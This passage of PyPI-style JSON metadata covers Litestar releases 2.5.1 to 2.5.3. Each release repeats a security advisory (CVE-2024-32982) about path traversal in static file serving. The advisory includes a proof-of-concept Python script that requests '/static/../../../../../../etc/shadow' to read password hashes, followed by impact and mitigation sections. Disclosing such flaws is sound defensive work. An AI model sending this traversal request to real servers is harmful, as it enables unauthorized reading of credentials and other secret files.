'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"e5d1f1db469d996bca5cdf2510b27d854911ddc5e1e0b79a7e130c05b9718763","md5":"b74519a174ea4ad36c449de08b67579c","sha256":"6423c8331add1ba52aca5a3769a3c41d3224b176ddd8778fb606f8db60b2e9cb"},"downloads":-1,"filename":"litestar-2.5.1-py3-none-any.whl","has_sig":false,"md5_digest":"b74519a174ea4ad36c449de08b67579c","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":497870,"upload_time":"2024-01-18T19:22:43","upload_time_iso_8601":"2024-01-18T19:22:43.834978Z","url":"https://files.pythonhosted.org/packages/e5/d1/f1db469d996bca5cdf2510b27d854911ddc5e1e0b79a7e130c05b9718763/litestar-2.5.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f8d47edfc49e584cce79dd8a8870609c068bbee7f4dd0a04aa667bd00274a09d","md5":"ede0c1ab6f8d0b0e0420a126c1f04baa","sha256":"6307278ba4f796542b0cdbfeac82a5e71233da20cb7f744d16c8c7723da3a1cd"},"downloads":-1,"filename":"litestar-2.5.1.tar.gz","has_sig":false,"md5_digest":"ede0c1ab6f8d0b0e0420a126c1f04baa","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":639317,"upload_time":"2024-01-18T19:22:46","upload_time_iso_8601":"2024-01-18T19:22:46.570587Z","url":"https://files.pythonhosted.org/packages/f8/d4/7edfc49e584cce79dd8a8870609c068bbee7f4dd0a04aa667bd00274a09d/litestar-2.5.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.2":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.2/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"c99b6728b28d8bffd47a94a75caa2cb9abc600e234d58ffab1d1cc63e1710a0a","md5":"ee2067d81a548dc5787f8c1f497f7246","sha256":"b869b57e3e469576ee478c6ce3f5a74b02e420096ef7fa74ed44497874f80738"},"downloads":-1,"filename":"litestar-2.5.2-py3-none-any.whl","has_sig":false,"md5_digest":"ee2067d81a548dc5787f8c1f497f7246","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":498127,"upload_time":"2024-01-27T18:48:40","upload_time_iso_8601":"2024-01-27T18:48:40.248192Z","url":"https://files.pythonhosted.org/packages/c9/9b/6728b28d8bffd47a94a75caa2cb9abc600e234d58ffab1d1cc63e1710a0a/litestar-2.5.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"fcae8bcd7072d79e29f260290f9ec3abc12a68ee6b025154fd6a2128b6e39766","md5":"6f0295fb8745dc507d9c320383469e6e","sha256":"7978eb33ad1211c102e9c362e1ec3a754a93741b46b3bc7bbf0f43804bef55f5"},"downloads":-1,"filename":"litestar-2.5.2.tar.gz","has_sig":false,"md5_digest":"6f0295fb8745dc507d9c320383469e6e","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":639936,"upload_time":"2024-01-27T18:48:42","upload_time_iso_8601":"2024-01-27T18:48:42.557113Z","url":"https://files.pythonhosted.org/packages/fc/ae/8bcd7072d79e29f260290f9ec3abc12a68ee6b025154fd6a2128b6e39766/litestar-2.5.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.3":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.3/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"a805d28da3fb63ec65c3416be889c669a1e9dfa05e2f128a9ed74292943ad471","md5":"80b6b7369e8e8bf3a2632890fbacb4e9","sha256":"399be58ec937f4009c318280389b154d6c2771e85d81708dff54afe0aa80dfe1"},"downloads":-1,"filename":"litestar-2.5.3-py3-none-any.whl","has_sig":false,"md5_digest":"80b6b7369e8e8bf3a2632890fbacb4e9","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":498168,"upload_time":"2024-01-29T18:30:57","upload_time_iso_8601":"2024-01-29T18:30:57.718103Z","url":"https://files.pythonhosted.org/packages/a8/05/d28da3fb63ec65c3416be889c669a1e9dfa05e2f128a9ed74292943ad471/litestar-2.5.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"7630b70df1a8a5cf1875a5249e1cc1bf3b9cb6ed9373410a6f1d94432a2dcd77","md5":"ad0dfda598d46e41d4fcab9f00a4b54c","sha256":"a58b28623758e0509b4b90c07a5301fad85b8d6b9a964ca94aea4cfe1cf2cc9a"},"downloads":-1,"filename":"litestar-2.5.3.tar.gz","has_sig":false,"md5_digest":"ad0dfda598d46e41d4fcab9f00a4b54c","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":641120,"upload_time":"2024-01-29T18:30:59","upload_time_iso_8601":"2024-01-29T18:30:59.908181Z","url":"https://files.pythonhosted.org/packages/76/30/b70df1a8a5cf1875a5249e1cc1bf3b9cb6ed9373410a6f1d94432a2dcd77/litestar-2.5.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further 